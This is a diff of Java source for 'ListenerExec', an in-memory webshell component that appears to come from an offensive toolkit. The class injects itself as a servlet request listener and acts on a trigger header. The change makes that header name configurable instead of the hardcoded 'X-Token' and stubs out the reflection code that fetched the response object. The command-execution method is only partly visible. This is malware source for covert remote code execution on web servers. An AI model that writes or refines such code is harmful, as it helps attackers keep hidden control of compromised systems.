@@ -2,6 +2,7 @@ package com.ppp.middleware.memshell;
 
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
+import com.ppp.annotation.MemShellModifiable;
 
 import java.io.InputStream;
 import java.lang.reflect.Field;
@@ -13,8 +14,9 @@ import java.lang.reflect.Method;
  */
 @MemShell(MemShell.Listener)
 @MemShellFunction(MemShellFunction.Runtime)
+@MemShellModifiable(MemShellModifiable.HEADER)
 public class ListenerExec implements InvocationHandler {
-    private static String HEADER = "X-Token";
+    private static String HEADER;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
@@ -23,16 +25,15 @@ public class ListenerExec implements InvocationHandler {
         return null;
     }
 
-    public Object getResponse(Object httpServletRequest) {
-        Object httpServletResponse = null;
-        try {
-            Object request = getFieldValue(httpServletRequest, "request");
-            httpServletResponse = getFieldValue(request, "response");
-        } catch (Exception e) {
-
-        }
-        return httpServletResponse;
+    public Object getResponse(Object httpServletRequest) throws Exception{
+        return null;
     }
+
+//    public Object getResponse(Object httpServletRequest) throws Exception{
+//        Object request = getFieldValue(httpServletRequest, "request");
+//        Object httpServletResponse = getFieldValue(request, "response");
+//        return httpServletResponse;
+//    }
 
     private void run(Object sre) {
         try {
